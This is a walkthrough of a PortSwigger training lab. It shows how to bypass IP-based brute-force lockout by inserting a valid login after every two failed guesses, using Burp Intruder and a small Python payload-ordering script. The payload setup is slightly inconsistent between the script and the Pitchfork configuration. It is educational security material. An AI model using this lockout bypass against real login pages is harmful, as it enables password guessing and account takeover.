# 🔐 PortSwigger Authentication Lab 6 Write-up

## Broken Brute-Force Protection, IP Block



---

## 📌 Overview

This repository contains my walkthrough for the **PortSwigger Web Security Academy** lab:

> **Broken brute-force protection, IP block**

The lab demonstrates how poorly designed brute-force protection mechanisms can be bypassed because of logical flaws in the authentication workflow.

---

## 🎯 Lab Objectives

- Understand how IP-based brute-force protection works.
- Learn how authentication lockout mechanisms are implemented.
- Discover how logic flaws can completely bypass brute-force protection.
- Practice using Burp Suite Intruder and Repeater.

---

## 🛠️ Tools Used

- Burp Suite Community/Professional
- Burp Repeater
- Burp Intruder
- Burp Browser (Chromium)
- Python 3
- PortSwigger Web Security Academy

---

# Step 1 — Access the Lab

Open the PortSwigger Web Security Academy lab and click **Access the Lab**.

Launch **Burp Suite**.

Navigate to

```
Proxy → Open Browser
```

Paste the lab URL into Burp's Chromium browser.


---

# Step 2 — Open the Login Page

Click

```
My Account
```

to access the login page.

Turn **Intercept ON** from Burp Proxy.

Login using

Username

```
carlos
```

Password

```
test
```

The login will fail.

---

# Step 3 — Locate the Login Request

Go to

```
Proxy → HTTP History
```

Find

```
POST /login
```

Right-click the request.

Choose

```
Send to Repeater
```

---

# Step 4 — Trigger the Lockout

Inside Repeater,

Click

```
Send
```

multiple times.

Eventually you'll receive

```
You have made too many incorrect login attempts.
Please try again in 1 minute(s).
```

This confirms that the application blocks login attempts after several failed requests.

> 📷 Screenshot

```
images/Screenshot(450).png
```

---

# Step 5 — Discover the Logic Flaw

Now login with the provided account.

Username

```
wiener
```

Password

```
peter
```

The response becomes

```
HTTP/2 302 Found
```

which indicates a successful login.

Observation:

Instead of locking the IP permanently,

the application resets the failed-login counter whenever a successful login occurs.

Meaning

❌ Wrong

❌ Wrong

✅ Correct Login

resets the counter.

This creates a logic flaw.

---

# Step 6 — Prepare Intruder

Go back to

```
POST /login
```

Right-click

```
Send to Intruder
```

Set the attack type to

```
Pitchfork
```

Highlight the username field.

Click

```
Add
```

Highlight the password field.

Click

```
Add
```

Now two payload positions exist.

---

# Step 7 — Prepare the Payload

Because only **two failed logins** are allowed before a successful login is required,

we must arrange the payload like this:

```
carlos,password1
carlos,password2
wiener,peter
carlos,password3
carlos,password4
wiener,peter
...
```

This continuously resets the lockout counter.

---

# Step 8 — Python Script

Save this as

```
sort_payload.py
```

```python
passwords = []

with open("passwords.txt") as f:
    passwords = [line.strip() for line in f]

with open("payload.txt", "w") as out:
    count = 0

    for password in passwords:
        out.write(f"carlos:{password}\n")
        count += 1

        if count == 2:
            out.write("wiener:peter\n")
            count = 0
```

Run

```bash
python3 sort_payload.py
```

It will generate

```
payload.txt
```

---

# Step 9 — Configure Payloads

Payload Position 1

Paste

```
usernames.txt
```

Payload Position 2

Paste

```
payload.txt
```

Attack Type

```
Pitchfork
```

---

# Step 10 — Configure Resource Pool

Navigate to

```
Resource Pool
```

Create a new resource pool.

Set

```
Maximum Concurrent Requests = 1
```

This prevents requests from being sent simultaneously.

---

# Step 11 — Start the Attack

Click

```
Start Attack
```

Burp will test every password while resetting the lockout counter after every second attempt.

---

# Step 12 — Identify the Password

Watch the response codes.

Most requests return

```
200
```

One request returns

```
302
```

That password is Carlos's correct password.

> 📷 Screenshot

```
images/Screenshot(466).png
```

---

# Step 13 — Login

Login using

Username

```
carlos
```

Password

```
<password found>
```

The lab is solved successfully.

> 📷 Screenshot

```
images/img7.png
```

---

# 💡 Why the Attack Works

The website blocks login attempts after three consecutive failures.

However,

a successful login using another account resets the failure counter.

Instead of

```
Wrong
Wrong
Wrong
```

we send

```
Wrong
Wrong
Correct
Wrong
Wrong
Correct
Wrong
Wrong
Correct
```

The protection never activates.

This is a **logic flaw**, not a technical vulnerability.

---

# 📚 Key Concepts Learned

- Authentication
- Brute Force
- Logic Flaw
- IP Blocking
- Burp Repeater
- Burp Intruder
- Pitchfork Attack
- Resource Pool
- HTTP Status Code Analysis

---



# 🚀 Skills Demonstrated

- Web Application Security
- Authentication Testing
- Burp Suite
- Intruder Automation
- Python Scripting
- Brute-force Testing
- OWASP Testing Methodology

---

# ⚠️ Disclaimer

This repository is created for **educational purposes only**.

All testing was performed on the intentionally vulnerable **PortSwigger Web Security Academy** lab.

Do **not** use these techniques against systems without explicit authorization.

---

## ⭐ If you found this repository useful, consider giving it a Star!
